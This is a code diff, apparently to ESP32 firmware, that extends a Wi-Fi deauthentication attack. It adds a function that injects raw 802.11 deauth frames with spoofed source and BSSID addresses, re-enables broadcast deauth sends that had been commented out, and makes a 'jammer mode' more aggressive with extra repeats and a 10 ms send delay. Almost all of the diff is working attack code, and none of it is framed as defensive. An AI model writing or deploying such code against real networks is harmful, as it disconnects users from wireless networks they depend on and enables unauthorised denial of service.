@@ -185,6 +185,21 @@ bool _send_deauth_frame_to_ap(uint8_t target_addr[])
     return true;
 }
 
+bool _broadcast_send_deauth_frame(){
+    uint8_t packet[26];
+    memcpy(packet, deauthPacket, 26);
+    
+    // Source address (the AP we're impersonating)
+    memcpy(&packet[10], broadcastAddress, 6);
+    
+    // BSSID (also the AP address)
+    memcpy(&packet[16], broadcastAddress, 6);
+    
+    // Send the frame
+    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+    return true;
+}
+
 void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bool safe_mode, bool jammer_mode)
 {
     init_wifi();
@@ -204,24 +219,23 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
     uint8_t target_count = static_cast<uint8_t>(scanned_network_count > MAX_NETWORKS ? MAX_NETWORKS : scanned_network_count);
     int start_target_index = 0;
     uint8_t repeats_per_target = burst_mode ? 3 : 1;
+
+    uint16_t send_delay = 100;
     
     if (jammer_mode)
     {
-        repeats_per_target += 2;
+        repeats_per_target += 5;
+        send_delay = 10;
     }
+
     if (safe_mode && repeats_per_target > 1)
     {
         repeats_per_target = 1;
     }
 
-    uint16_t send_delay = 85;
     if (safe_mode)
     {
         send_delay = 170;
-    }
-    else if (jammer_mode)
-    {
-        send_delay = 35;
     }
     
     esp_wifi_set_promiscuous(true);
@@ -277,17 +291,17 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
                     {
                         sent_count++;
                     }
-                    //if (_broadcast_send_deauth_frame(target_addr, broadcastAddress))
-                    //{
-                    //    sent_count++;
-                    //}
+                    if (_broadcast_send_deauth_frame())
+                    {
+                        sent_count++;
+                    }
                 }
                 else
                 {
-                    //if (_broadcast_send_deauth_frame(target_addr, broadcastAddress))
-                    //{
-                    //    sent_count++;
-                    //}
+                    if (_broadcast_send_deauth_frame())
+                    {
+                        sent_count++;
+                    }
                 }
             }
         }
@@ -307,11 +321,10 @@ void launch_deauth(const char *attack_type, bool random_mac, bool burst_mode, bo
     }
 
     delay(250);
-    is_menu_pressed = false;
-    is_home_pressed = false;
-    is_select_pressed = false;
-    is_movefd_pressed = false;
-    is_movebd_pressed = false;
+
+    clear_button_state();
+
     esp_wifi_set_promiscuous(false);
+
     disable_wifi();
 }
